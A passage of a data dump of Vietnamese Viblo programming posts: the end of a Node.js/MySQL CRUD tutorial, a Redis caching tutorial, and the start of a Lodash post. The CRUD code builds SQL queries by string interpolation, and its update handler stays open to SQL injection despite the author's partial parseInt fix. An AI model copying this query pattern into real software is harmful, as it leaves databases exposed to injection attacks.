ti\u1ebft, s\u1eeda, x\u00f3a. M\u00ecnh c\u00f3 trang index.pug nh\u01b0 sau: \n```php\n.products\n  head\n    style.\n      table, th, td {\n      border: 1px solid black;\n      border-collapse: collapse;\n      margin: 10px 30px;\n      }\n      th, td {\n        padding: 5px;\n        text-align: left;\n      }\n  form(action=\"/search\", method=\"GET\")\n    input(name=\"id\", type=\"text\", placeholder=\"id\")\n    button Search\n  table\n    thead\n      tr\n        th  Id\n        th  Title\n        th(colspan='3') Action\n    tbody\n    each pro in products\n      tr\n        td=  pro.id\n        td=  pro.title\n        td\n          a(href=`/detail?id=${pro.id}`) Detail\n        td\n          a(href=`/edit?id=${pro.id}`) Update\n        td\n          a(href=`/delete?id=${pro.id}`) Delete\n  a(href='/create') New\n```\nnh\u00ecn b\u00ean ngo\u00e0i th\u00ec n\u00f3 s\u1ebd nh\u01b0 th\u1ebf n\u00e0y \n![](https://images.viblo.asia/04342d9e-dae0-4b20-ae03-4dd0bb2cacda.png)\n\n\u00dd t\u01b0\u1edfng l\u00e0 khi m\u00ecnh b\u1ea5m v\u00e0o `Detail` th\u00ec s\u1ebd chuy\u1ec3n sang trang detail v\u00ec th\u1ebf m\u00ecnh c\u1ea7n c\u00f3 m\u1ed9t trang l\u00e0 `detail.pug` nh\u01b0 sau: \n```php\nh1 Detail\neach data in products\n  p id:\n    span= data.id\n  p title:\n    span= data.title\na(href='/') Go to home\n```\nV\u00e0 h\u00e0m trong `index.js` \u0111\u1ec3 chuy\u1ec3n t\u1eeb trang index sang trang detail nh\u01b0 sau: \n```php\napp.get('/detail', function (req, res) {\n    var id = parseInt(req.query.id);\n    var sql=`SELECT * FROM products where id = '${id}'`;\n    conn.query(sql, function (err, data, fields) {\n        res.render('detail', {\n            products: data\n        });\n    });\n})\n```\nOK v\u1eady l\u00e0 ch\u00fang ta \u0111\u00e3 lm xong ch\u1ee9c n\u0103ng xem chi ti\u1ebft\n![](https://images.viblo.asia/ecb9ad80-67cd-4fa3-a58d-ae4353e3236a.gif)\n\n## Delete \nCh\u1ee9c n\u0103ng delete th\u00ec s\u1ebd \u0111\u01a1n gi\u1ea3n h\u01a1n b\u1ea1n ch\u1ec9 c\u1ea7n g\u1ecdi \u0111\u1ebfn h\u00e0m delete truy\u1ec1n id v\u00e0o v\u00e0 redirect v\u1ec1 l\u1ea1i trang ch\u1ee7 l\u00e0 \u0111\u01b0\u1ee3c. h\u00e0m delete nh\u01b0 sau: \n```php\napp.get('/delete', function (req, res) {\n    var id = parseInt(req.query.id);\n    var sql=`Delete FROM products where id = ${id}`;\n    conn.query(sql, function (err, data, fields) {\n    });\n    res.redirect('/');\n})\n```\n\u0110\u00e2y l\u00e0 k\u1ebft qu\u1ea3 \n![](https://images.viblo.asia/04ed014b-f51c-4cb3-a2f6-aa8f13591980.gif)\n\n# Update\nCh\u1ee9c n\u0103ng update th\u00ec m\u00ecnh s\u1ebd th\u1ef1c hi\u1ec7n nh\u01b0 sau: \u0110\u1ea7u ti\u1ec1n l\u00e0 s\u1ebd t\u1ea1o m\u1ed9t trang \u0111\u1ec3 c\u00f3 th\u1ec3 hi\u1ec3n th\u1ecb data m\u00e0 ngu\u1eddi d\u00f9ng mu\u1ed1n s\u1eeda. \u1ede trang \u0111\u00f3 sau khi ng\u01b0\u1eddi d\u00f9ng s\u1eeda xong \u1ea5n v\u00e0o n\u00fat update th\u00ec m\u00ecnh s\u1ebd g\u1ecdi \u0111\u1ebfn h\u00e0m update \u0111\u1ec3 ti\u1ebfn h\u00e0nh update l\u1ea1i s\u1ea3n ph\u1ea7m v\u00e0 tr\u1ea3 v\u1ec1 trang danh s\u00e1ch s\u1ea3n ph\u1ea9m.\n\n\u0110\u1ea7u ti\u00ean s\u1ebd l\u00e0 h\u00e0m  \u0111\u1ec3 g\u1ecdi \u0111\u1ebfn trang update s\u1ea3n ph\u1ea9m \n```php\napp.get('/edit', function (req, res) {\n    var id = parseInt(req.query.id);\n    var sql=`SELECT * FROM posts where id = '${id}'`;\n    conn.query(sql, function (err, data, fields) {\n        res.render('update', {\n            posts: data\n        });\n    });\n})\n```\nH\u00e0m n\u00e0y c\u0169ng t\u01b0\u01a1ng t\u1ef1 nh\u01b0 h\u00e0m g\u1ecdi \u0111\u1ebfn trang chi ti\u1ebft s\u1ea3n ph\u1ea9m, \u1edf \u0111\u00e2y m\u00ecnh g\u1ecdi \u0111\u1ebfn trang update. M\u00ecnh c\u00f3 trang update.pug nh\u01b0 sau:\n```php\nh1 Update\neach data in posts\n    form(action=\"/edit\" method=\"POST\")\n        input(type=\"text\", placeholder=\"id\", name=\"id\" value=`${data.id}` readonly)\n        br\n        label(id=\"title\")\n        input(type=\"text\", placeholder=\"title\", name=\"title\" value=`${data.title}`)\n        br\n        button Update\n```\n\u1ede \u0111\u00e2y m\u00ecnh cho hi\u1ec3n th\u1ecb s\u1ea3n ph\u1ea7m m\u00e0 ng\u01b0\u1eddi d\u00f9ng mu\u1ed1n s\u1eeda v\u00e0 v\u00ec thu\u1ed9c t\u00ednh id m\u00ecnh \u0111\u1ec3 l\u00e0 kh\u00f3a ch\u00ednh v\u00e0 t\u1ef1 \u0111\u1ed9ng t\u0103ng v\u00ec th\u1ebf m\u00ecnh s\u1ebd \u0111\u1ec3 th\u1ebb input c\u1ee7a id c\u00f3 thu\u1ed9c t\u00ednh l\u00e0 `readonly` \u0111\u1ec3 kh\u00f4ng cho ng\u01b0\u1eddi d\u00f9ng s\u1eeda id. Sau khi ng\u01b0\u1eddi d\u00f9ng s\u1eeda xong `title`v\u00e0 \u1ea5n `Update` th\u00ec s\u1ebd g\u1ecdi \u0111\u1ebfn h\u00e0m update \u0111\u1ec3 ti\u1ebfn h\u00e0nh update data. H\u00e0m update nh\u01b0 sau :\n\n```php\napp.post('/edit', function (req, res) {\n    var params =req.body;\n    var sql = `update posts set title = '${params.title}' where id = ${params.id};`;\n    conn.query(sql, function (err, result) {\n        if (err)    console.log(err);\n        console.log(\"1 record update\");\n      });\n    res.redirect('/');\n})\n```\n\u1ede h\u00e0m n\u00e0y th\u00ec m\u00ecnh l\u1ea5y data t\u1eeb trang update.pug g\u1eedi l\u00ean v\u00e0 ti\u1ebfn h\u00e0nh update l\u1ea1i gi\u1eef li\u1ec7u v\u00e0 cu\u1ed1i c\u00f9ng l\u00e0 tr\u1ea3 v\u1ec1 trang hi\u1ec3n th\u1ecb danh s\u00e1ch s\u1ea3n ph\u1ea9m th\u00f4i.\n\n\u0110\u00e2y l\u00e0 k\u1ebft qu\u1ea3 :\n\n![](https://images.viblo.asia/b54bb623-8f68-4611-9143-bd0f0e77cd59.gif)\n\n# K\u1ebft Lu\u1eadn\nNh\u01b0 v\u1eady l\u00e0 m\u00ecnh \u0111\u00e3 ho\u00e0n th\u00e0nh ch\u1ee9c n\u0103ng t\u00ecm ki\u1ebfm, xem chi ti\u1ebft v\u00e0 c\u1eadp nh\u1eadt v\u00e0 x\u00f3a s\u1ea3n ph\u1ea7m, B\u00e0i ti\u1ebfp theo m\u00ecnh s\u1ebd n\u00f3i v\u1ec1 ph\u1ea7n validate. \u00c0 qu\u00ean b\u00e0i vi\u1ebft c\u00f3 ti\u00eau \u0111\u1ec1 l\u00e0  `CRUD Nodejs v\u1edbi mysql` m\u00e0 l\u1ea1i kh\u00f4ng th\u1ea5y ph\u1ea7n `Create` \u0111\u00e2u  :D, th\u00ec ph\u1ea7n create m\u00ecnh \u0111\u00e3 n\u00f3i \u1edf b\u00e0i tr\u01b0\u1edbc n\u00ean m\u00ecnh xin ph\u00e9p kh\u00f4ng n\u00f3i l\u1ea1i, m\u1ecdi ng\u01b0\u1eddi c\u00f3 th\u1ec3 xem l\u1ea1i ph\u1ea7n \u1edf [\u0111\u00e2y](https://viblo.asia/p/post-method-voi-body-parser-trong-nodejs-thu-lam-chuc-nang-them-moi-Az45b4YwZxY) nh\u00e9 :). B\u00e0i vi\u1ebft c\u00f2n ph\u1ea7n n\u00e0o thi\u1ebfu s\u00f3t r\u1ea5t mong c\u00e1c b\u1ea1n comment xu\u1ed1ng b\u00ean d\u01b0\u1edbi \u0111\u1ec3 m\u00ecnh \u0111\u01b0\u1ee3c b\u1ed5 sung, n\u1ebfu th\u1ea5y b\u00e0i vi\u1ebft h\u1eefu \u00edch th\u00ec h\u00e3y cho m\u00ecnh m\u1ed9t upvote nh\u00e9 \ud83d\ude03 , \u1ea4n follow \u0111\u1ec3 c\u00f3 th\u1ec3 theo d\u00f5i \u0111\u01b0\u1ee3c nh\u1eefng b\u00e0i vi\u1ebft m\u1edbi nh\u1ea5t c\u1ee7a m\u00ecnh nh\u00e9. M\u1ed9t l\u1ea7n n\u1eefa xin c\u1ea3m \u01a1n c\u00e1c b\u1ea1n !!!\n## L\u01b0u \u00fd \nSau khi public b\u00e0i vi\u1ebft th\u00ec m\u00ecnh \u0111\u00e3 \u0111\u01b0\u1ee3c m\u1ed9t  ng\u01b0\u1eddi anh ch\u1ec9 ra l\u1ed7 h\u1ed5ng trong code :D \u0111\u00f3 l\u00e0 d\u1ec5 b\u1ecb t\u1ea5n c\u00f4ng SQL Injection.  N\u1ebfu ch\u01b0a rox SQL Injection l\u00e0 g\u00ec th\u00ec m\u1ecdi ng\u01b0\u1eddi c\u00f3 th\u1ec3 tham kh\u1ea3o b\u00e0i vi\u1ebft  [n\u00e0y](https://viblo.asia/p/sql-injection-va-cach-phong-chong-OeVKB410lkW) c\u0169ng l\u00e0 c\u1ee7a m\u1ed9t ng\u01b0\u1eddi anh m\u00ecnh h\u1ec7 h\u1ec7.\n\nTh\u00ec n\u00f3i qua v\u1ec1 SQL injection th\u00ec `SQL injection`  l\u00e0 m\u1ed9t k\u1ef9 thu\u1eadt cho ph\u00e9p nh\u1eefng k\u1ebb t\u1ea5n c\u00f4ng l\u1ee3i d\u1ee5ng l\u1ed7 h\u1ed5ng c\u1ee7a vi\u1ec7c ki\u1ec3m tra d\u1eef li\u1ec7u \u0111\u1ea7u v\u00e0o trong c\u00e1c \u1ee9ng d\u1ee5ng web v\u00e0 c\u00e1c th\u00f4ng b\u00e1o l\u1ed7i c\u1ee7a h\u1ec7 qu\u1ea3n tr\u1ecb c\u01a1 s\u1edf d\u1eef li\u1ec7u tr\u1ea3 v\u1ec1 \u0111\u1ec3 ti\u00eam v\u00e0o v\u00e0 thi h\u00e0nh c\u00e1c c\u00e2u l\u1ec7nh SQL b\u1ea5t h\u1ee3p ph\u00e1p.\n\ncode \u1edf tr\u00ean m\u00ecnh \u0111ang vi\u1ebft \n```php\nvar id = req.query.id;\n``` \nnh\u01b0 th\u1ebf n\u00e0y v\u00e0 m\u00ecnh s\u1ebd s\u1eeda l\u1ea1i \n```php\nvar id = parseInt(req.query.id);\n```\n\u0110\u1ec3 r\u00e0ng bu\u1ed9c ki\u1ec3u d\u1eef li\u1ec7u cho tr\u01b0\u1eddng `id`. Do b\u00e0i series n\u00e0y m\u00ecnh \u0111ang n\u00f3i v\u1ec1 nh\u1eefng th\u1ee9 c\u01a1 b\u1ea3n cho ng\u01b0\u1eddi m\u1edbi b\u1eaft \u0111\u1ea7u v\u00ec th\u1ebf m\u00ecnh \u0111ang s\u1eed d\u1ee5ng c\u00e2u l\u1ec7nh SQL thu\u1ea7n n\u00ean s\u1ebd d\u1ec5 b\u1ecb t\u1ea5n c\u00f4ng h\u01a1n. C\u00f2n tr\u00ean th\u1ef1c t\u1ebf hi\u1ec7n nay th\u00ec h\u1ea7u nh\u01b0 ch\u00fang ta th\u01b0\u1eddng s\u1eed d\u1ee5ng c\u00e1c framework \u0111\u1ec3 ph\u00e1t tri\u1ec3n n\u00ean c\u0169ng h\u1ea1n ch\u1ebf \u0111\u01b0\u1ee3c t\u1ea5n c\u00f4ng `SQL injection` v\u00ec c\u00e1c framework \u0111\u1ec1u \u0111\u00e3 \u0111\u01b0\u1ee3c test c\u1ea9n th\u1eadn \u0111\u1ec3 ph\u00f2ng tr\u00e1nh c\u00e1c l\u1ed7i. V\u00ec th\u1ebf n\u00ean c\u00e1ch t\u1ed1t nh\u1ea5t l\u00e0 ch\u00fang ta n\u00ean s\u1eed d\u1ee5ng  c\u00e1c framework thay v\u00ec code thu\u1ea7n. M\u1ed9t l\u1ea7n n\u1eefa c\u1ea3m \u01a1n c\u00e1c b\u1ea1n ;)",
      published_at: "2021-01-17 12:24:29",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 10:00:25",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 6,
      points: 6,
      views_count: 283,
      clips_count: 3,
      comments_count: 3,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url:
        "https://images.viblo.asia/43439786-baf6-40b8-a303-81213688427d.png",
      user: {
        data: {
          id: 38554,
          url: "https://viblo.asia/u/BuiHuyHoang",
          avatar: "771ca955-8433-4777-b66a-8729486ff350.jpg",
          name: "B\u00f9i Huy Ho\u00e0ng",
          username: "BuiHuyHoang",
          followers_count: 29,
          reputation: 969,
          posts_count: 25,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "happy-new-year",
            name: "Happy New Year",
            primary: false,
            image:
              "https://placehold.jp/16/f39c12/ffffff/80x80.jpg?text=Happy+New+Year&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "nodejs",
            name: "Node.js",
            primary: false,
            image:
              "https://placehold.jp/16/d35400/ffffff/80x80.jpg?text=Nodejs&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "mysql",
            name: "MySql",
            primary: false,
            image:
              "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=MySql&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [
          {
            id: 12974,
            url: "https://viblo.asia/u/huukimit",
            avatar: "deda57c2-6500-4b3d-99e4-800293903e24.jpg",
            name: "Nguy\u1ec5n H\u1eefu Kim",
            username: "huukimit",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 38554,
            url: "https://viblo.asia/u/BuiHuyHoang",
            avatar: "771ca955-8433-4777-b66a-8729486ff350.jpg",
            name: "B\u00f9i Huy Ho\u00e0ng",
            username: "BuiHuyHoang",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
        ],
      },
    },
    {
      id: 48296,
      title: "Cache d\u1eef li\u1ec7u Nodejs v\u1edbi Redis",
      slug: "bJzKmPNr59N",
      url: "https://viblo.asia/p/cache-du-lieu-nodejs-voi-redis-bJzKmPNr59N",
      user_id: 50683,
      moderation: null,
      transliterated: "cache-du-lieu-nodejs-voi-redis",
      contents_short:
        'M\u1ed9t t\u00ed g\u1ecdi l\u00e0 l\u00fd thuy\u1ebft \u0111\u1ec3 anh em tham kh\u1ea3o\nCache l\u00e0 g\u00ec?\n"Caching l\u00e0 m\u1ed9t k\u1ef9 thu\u1eadt t\u0103ng \u0111\u1ed9 truy xu\u1ea5t d\u1eef li\u1ec7u v\u00e0 gi\u1ea3m t\u1ea3i cho h\u1ec7 th\u1ed1ng. Cache l\u00e0 n\u01a1i l\u01b0u t\u1eadp h\u1ee3p c\u00e1c d\u1eef li\u1ec7u, th\u01b0\u1eddng c\u00f3 t\u00ednh ch\u1ea5t nh\u1ea5t ...',
      contents:
        "## M\u1ed9t t\u00ed g\u1ecdi l\u00e0 l\u00fd thuy\u1ebft \u0111\u1ec3 anh em tham kh\u1ea3o\n### Cache l\u00e0 g\u00ec?\n\"Caching l\u00e0 m\u1ed9t k\u1ef9 thu\u1eadt t\u0103ng \u0111\u1ed9 truy xu\u1ea5t d\u1eef li\u1ec7u v\u00e0 gi\u1ea3m t\u1ea3i cho h\u1ec7 th\u1ed1ng. Cache l\u00e0 n\u01a1i l\u01b0u t\u1eadp h\u1ee3p c\u00e1c d\u1eef li\u1ec7u, th\u01b0\u1eddng c\u00f3 t\u00ednh ch\u1ea5t nh\u1ea5t th\u1eddi, cho ph\u00e9p s\u1eed d\u1ee5ng l\u1ea1i d\u1eef li\u1ec7u \u0111\u00e3 l\u1ea5y ho\u1eb7c t\u00ednh to\u00e1n tr\u01b0\u1edbc \u0111\u00f3, n\u00ean s\u1ebd gi\u00fap t\u0103ng t\u1ed1c cho vi\u1ec7c truy xu\u1ea5t d\u1eef li\u1ec7u \u1edf nh\u1eefng l\u1ea7n sau.\". Em xin ph\u00e9p \u0111\u01b0\u1ee3c tr\u00edch ngu\u1ed3n c\u00e1c b\u00e1c mu\u1ed1n \u0111\u1ecdc th\u00eam th\u00ec b\u01a1i v\u00e0o  [\u0111\u00e2y](https://viblo.asia/p/caching-la-gi-va-no-hoat-dong-nhu-the-nao-m68Z0QpXlkG)\n### L\u1ee3i \u00edch c\u1ee7a vi\u1ec7c cache data\n- T\u0103ng t\u1ed1c \u0111\u1ed9 x\u1eed l\u00fd, thay v\u00ec ph\u1ea3i g\u1ecdi API b\u00ean th\u1ee9 ba ho\u1eb7c query database nhi\u1ec1u l\u1ea7n. Ngo\u00e0i ra, gi\u1ea3m s\u1ed1 l\u1ea7n g\u1ecdi API ho\u1eb7c query database c\u00f2n gi\u1ea3m thi\u1ec3u b\u0103ng th\u00f4ng truy\u1ec1n t\u1ea3i gi\u1eefa c\u00e1c server v\u00e0 gi\u1ea3m thi\u1ec3u x\u1eed l\u00fd t\u1eeb CPU nh\u1ea5t l\u00e0 v\u1edbi nh\u1eefng d\u1eef li\u1ec7u \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng nhi\u1ec1u l\u1ea7n trong \u1ee9ng d\u1ee5ng.\n- V\u1eabn c\u00f3 th\u1ec3 truy v\u1eabn \u0111\u01b0\u1ee3c data khi kh\u00f4ng c\u00f3 k\u1ebft n\u1ed1i gi\u1eefa c\u00e1c server.\n- \u0110\u00e1p \u1ee9ng \u0111\u01b0\u1ee3c truy v\u1ea5n l\u1edbn trong th\u1eddi gian ng\u1eafn. tr\u1ea3 v\u1ec1 d\u1eef li\u1ec7u g\u1ea7n nh\u01b0 ngay l\u1eadp t\u1ee9c v\u1edbi nh\u1eefng d\u1eef li\u1ec7u c\u00f3 trong b\u1ed9 nh\u1edb cache.\n### C\u0169ng c\u00f3 m\u1ed9t s\u1ed1 h\u1ea1n ch\u1ebf\n- N\u00f3i t\u00fam l\u1ea1i th\u00ec cache c\u0169ng l\u00e0 m\u1ed9t k\u1ef9 thu\u1eadt d\u00f9ng b\u1ed9 nh\u1edb \u0111\u1ec3 \u0111\u1ec3 t\u1ed1c \u0111\u1ed9 n\u00ean d\u0129 nhi\u00ean l\u00e0 t\u1ed1n th\u00eam m\u1ed9t v\u00f9ng nh\u1edb \u0111\u1ec3 l\u01b0u d\u1eef li\u1ec7u cache (d\u00f9 c\u0169ng kh\u00f4ng nhi\u1ec1u m\u1ea5y).\n- N\u1ebfu data cache ch\u1ec9 d\u00f9ng \u0111\u00fang m\u1ed9t l\u1ea7n th\u00ec vi\u1ec7c cache kh\u00f4ng nh\u1eefng kh\u00f4ng c\u00f3 l\u1ee3i \u00edch g\u00ec m\u00e0 c\u00f2n l\u00e0m ch\u1eadm \u1ee9ng d\u1ee5ng.\n- N\u1ebfu kh\u00f4ng x\u00f3a cache khi kh\u00f4ng c\u00f2n s\u1eed d\u1ee5ng s\u1ebd g\u00e2y ra vi\u1ec7c l\u00e3ng ph\u00ed b\u1ed9 nh\u1edb.\n\n### Redis l\u00e0 g\u00ec?\n\"Redis l\u00e0 g\u00ec? \u2013 Redis (REmote DIctionary Server) l\u00e0 m\u1ed9t m\u00e3 ngu\u1ed3n m\u1edf \u0111\u01b0\u1ee3c d\u00f9ng \u0111\u1ec3 l\u01b0u tr\u1eef d\u1eef li\u1ec7u c\u00f3 c\u1ea5u tr\u00fac, c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng nh\u01b0 m\u1ed9t database, b\u1ed9 nh\u1edb cache hay m\u1ed9t message broker.\" Em l\u1ea1i xin ph\u00e9p tr\u00edch ngu\u1ed3n, c\u00e1c b\u00e1c mu\u1ed1n \u0111\u1ecdc th\u00eam t\u00ed l\u00fd thuy\u1ebft th\u00ec b\u01a1i v\u00e0o  [\u0111\u00e2y](https://topdev.vn/blog/redis-la-gi/). N\u00f3i t\u00fam l\u1ea1i l\u00e0 kh\u00f4ng ph\u1ea3i code NodeJS m\u1edbi d\u00f9ng Redis m\u00e0 n\u00f3 c\u00f3 th\u1ec3 l\u01b0u t\u00f9m lum th\u1ee9.\n### Redis ho\u1ea1t \u0111\u1ed9ng nh\u01b0 th\u1ebf n\u00e0o\n\"Kh\u00e1c v\u1edbi RDMS nh\u01b0 MySQL, hay PostgreSQL, Redis kh\u00f4ng c\u00f3 b\u1ea3ng. Redis l\u01b0u tr\u1eef data d\u01b0\u1edbi d\u1ea1ng key-value. Th\u1ef1c t\u1ebf th\u00ec memcache c\u0169ng l\u00e0m v\u1eady, nh\u01b0ng ki\u1ec3u d\u1eef li\u1ec7u c\u1ee7a memcache b\u1ecb h\u1ea1n ch\u1ebf, kh\u00f4ng \u0111a d\u1ea1ng \u0111\u01b0\u1ee3c nh\u01b0 Redis, do \u0111\u00f3 kh\u00f4ng h\u1ed7 tr\u1ee3 \u0111\u01b0\u1ee3c nhi\u1ec1u thao t\u00e1c t\u1eeb ph\u00eda ng\u01b0\u1eddi d\u00f9ng. D\u01b0\u1edbi \u0111\u00e2y l\u00e0 s\u01a1 l\u01b0\u1ee3c v\u1ec1 c\u00e1c ki\u1ec3u d\u1eef li\u1ec7u Redis d\u00f9ng \u0111\u1ec3 l\u01b0u value.\" t\u1edb l\u1ea1i xin tr\u00edch c\u1ee7a b\u1ea1n @NTPhuongThao - https://viblo.asia/p/nguyen-tac-hoat-dong-cua-redis-server-naQZRq7GKvx\n\n## S\u1eed d\u1ee5ng Redis trong th\u1ef1c t\u1ebf\n![S\u1eed d\u1ee5ng Redis trong th\u1ef1c t\u1ebf](https://images.viblo.asia/89732de7-b554-422a-9ed9-e4ef9352fc29.png)\n\u0110\u1ec3 h\u1ea1n ch\u1ebf vi\u1ec7c request nhi\u1ec1u l\u1ea7n \u0111\u1ebfn server kh\u00e1ch ho\u1eb7c x\u1eed l\u00fd ph\u1ee9c t\u1ea1p, khi m\u1ed9t request \u0111\u01b0\u1ee3c g\u1ecdi \u0111\u1ebfn server th\u00ec tr\u01b0\u1edbc ti\u00ean server s\u1ebd ki\u1ec3m tra xem d\u1eef li\u1ec7u c\u00f3 trong server redis hay ch\u01b0a?\nN\u1ebfu c\u00f3 r\u1ed3i th\u00ec l\u1ea5y d\u1eef li\u1ec7u trong cache tr\u1ea3 v\u1ec1 cho ng\u01b0\u1eddi d\u00f9ng.\nN\u1ebfu ch\u01b0a c\u00f3 th\u00ec th\u1ef1c hi\u1ec7n thao t\u00e1c, tr\u1ea3 v\u1ec1 cho ng\u01b0\u1eddi d\u00f9ng \u0111\u1ed3ng th\u1eddi c\u0169ng l\u01b0u d\u1eef li\u1ec7u \u0111\u00f3 v\u00e0o cache.\n\nT\u1edb kh\u00f4ng c\u00f3 code \u1edf \u0111\u00e2y n\u00ean d\u1ecbch t\u1ea1m m\u1ed9t b\u00e0i v\u00ed d\u1ee5 v\u1ec1 vi\u1ec7c t\u1ea1o m\u1ed9t server c\u00f3 redis v\u00e0 ki\u1ec3m tra t\u1ed1c \u0111\u1ed9 response khi b\u1ed9 nh\u1edb cache c\u00f3 data v\u00e0 khi b\u1ed9 nh\u1edb cache kh\u00f4ng c\u00f3 data.\n\nT\u1ea1o m\u1edbi m\u1ed9t th\u01b0 m\u1ee5c:\n`mkdir redis-cache`\n\nCd \u0111\u1ebfn th\u01b0 m\u1ee5c v\u1eeba \u0111\u01b0\u1ee3c t\u1ea1o:\n`cd redis-cache`\n\nT\u1ea1o file package.json file:\n`npm init --force`\n\n--force T\u1ea1o file pakage.json v\u1edbi c\u00e1c gi\u00e1 tr\u1ecb m\u1eb7c \u0111\u1ecbnh m\u00e0 b\u1ea1n kh\u00f4ng b\u1ecb h\u1ecfi th\u00eam th\u00f4ng tin g\u00ec. Sau khi ho\u00e0n th\u00e0nh b\u1ea1n s\u1ebd c\u00f3 m\u1ed9t file pakage.json trong th\u01b0 m\u1ee5c hi\u1ec7n t\u1ea1i.\n\nT\u1ea1o m\u1ed9t file server.js \u1edf th\u01b0 m\u1ee5c hi\u1ec7n t\u1ea1i.\n\nC\u00e0i \u0111\u1eb7t Express, Redis, and node-fetch modules:\n`npm install --save node-fetch express redis`\n\nB\u00e2y gi\u1edd Redis \u0111\u00e3 \u0111\u01b0\u1ee3c c\u00e0i \u0111\u1eb7t v\u00e0 c\u00e1c b\u1ea1n c\u00f3 th\u1ec3 coppy \u0111o\u1ea1n code n\u00e0y v\u00e0o file server.js.\n\n```\nconst express = require('express')\nconst fetch = require(\"node-fetch\");\nconst redis = require('redis')\n \n// create express application instance\nconst app = express()\n \n// create and connect redis client to local instance.\nconst client = redis.createClient(6379)\n \n// echo redis errors to the console\nclient.on('error', (err) => {\n    console.log(\"Error \" + err)\n});\n \n// get photos list\napp.get('/photos', (req, res) => {\n \n    // key to store results in Redis store\n    const photosRedisKey = 'user:photos';\n \n    // Try fetching the result from Redis first in case we have it cached\n    return client.get(photosRedisKey, (err, photos) => {\n \n        // If that key exists in Redis store\n        if (photos) {\n \n            return res.json({ source: 'cache', data: JSON.parse(photos) })\n \n        } else { // Key does not exist in Redis store\n \n            // Fetch directly from remote api\n            fetch('https://jsonplaceholder.typicode.com/photos')\n                .then(response => response.json())\n                .then(photos => {\n \n                    // Save the  API response in Redis store,  data expire time in 3600 seconds, it means one hour\n                    client.setex(photosRedisKey, 3600, JSON.stringify(photos))\n \n                    // Send JSON response to client\n                    return res.json({ source: 'api', data: photos })\n \n                })\n                .catch(error => {\n                    // log error message\n                    console.log(error)\n                    // send error to the client \n                    return res.json(error.toString())\n                })\n        }\n    });\n});\n \n// start express server at 3000 port\napp.listen(3000, () => {\n    console.log('Server listening on port: ', 3000)\n});\n```\n\nV\u00e0 b\u00e2y gi\u1edd m\u1ed9t server s\u1eed d\u1ee5ng redis \u0111\u1ec3 cache data \u0111\u00e3 h\u00f2a th\u00e0nh, b\u00e2y gi\u1edd ch\u00fang ta s\u1eed d\u1ee5ng postman \u0111\u1ec3 th\u1eed xem redis c\u00f3 hi\u1ec7u qu\u1ea3 kh\u00f4ng.\n\n\u1ede request \u0111\u1ea7u ti\u00ean,\n![](https://images.viblo.asia/19ba6261-d32f-4148-985a-3e7387118166.png)\n\nRedis ch\u01b0a cache data, server ph\u1ea3i g\u1eedi reqest \u0111\u1ebfn server kh\u00e1c \u0111\u1ec3 l\u1ea5y data n\u00ean reponse t\u1ed1n nhi\u1ec1u th\u1eddi gian (3325 milliseconds).\n\nNh\u01b0ng t\u1eeb request th\u1ee9 2 tr\u1edf \u0111i,\n![](https://images.viblo.asia/579cfad2-861e-4f80-a887-06d7fbb24155.png)\n\nRedis \u0111\u00e3 c\u00f3 data cache t\u1eeb request tr\u01b0\u1edbc n\u00ean reponse v\u1ec1 r\u1ea5t nhanh (1048 milliseconds).\n\nT\u00e0i li\u1ec7u tham kh\u1ea3o: https://medium.com/tech-tajawal/introduction-to-caching-redis-node-js-e477eb969eab, https://viblo.asia/p/caching-la-gi-va-no-hoat-dong-nhu-the-nao-m68Z0QpXlkG, https://topdev.vn/blog/redis-la-gi, https://viblo.asia/p/nguyen-tac-hoat-dong-cua-redis-server-naQZRq7GKvx",
      published_at: "2021-01-12 20:34:16",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 11:23:07",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 5,
      points: 2,
      views_count: 389,
      clips_count: 2,
      comments_count: 0,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url:
        "https://images.viblo.asia/89732de7-b554-422a-9ed9-e4ef9352fc29.png",
      user: {
        data: {
          id: 50683,
          url: "https://viblo.asia/u/khanhvuquoc.1994",
          avatar: "9a5b52db-b9dd-479f-92be-f93bb90eeb7f.gif",
          name: "KhanhVQ",
          username: "khanhvuquoc.1994",
          followers_count: 4,
          reputation: 202,
          posts_count: 8,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "redis",
            name: "Redis",
            primary: false,
            image:
              "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=Redis&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "cache",
            name: "Cache",
            primary: false,
            image:
              "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=Cache&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "nodejs",
            name: "Node.js",
            primary: false,
            image:
              "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=Nodejs&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [],
      },
    },
    {
      id: 48970,
      title:
        "Lodash m\u1ed9t th\u01b0 vi\u1ec7n c\u0169ng ra g\u00ec v\u00e0 n\u00e0y n\u1ecd",
      slug: "E375z7xjKGW",
      url:
        "https://viblo.asia/p/lodash-mot-thu-vien-cung-ra-gi-va-nay-no-E375z7xjKGW",
      user_id: 50683,
      moderation: null,
      transliterated: "lodash-mot-thu-vien-cung-ra-gi-va-nay-no",
      contents_short:
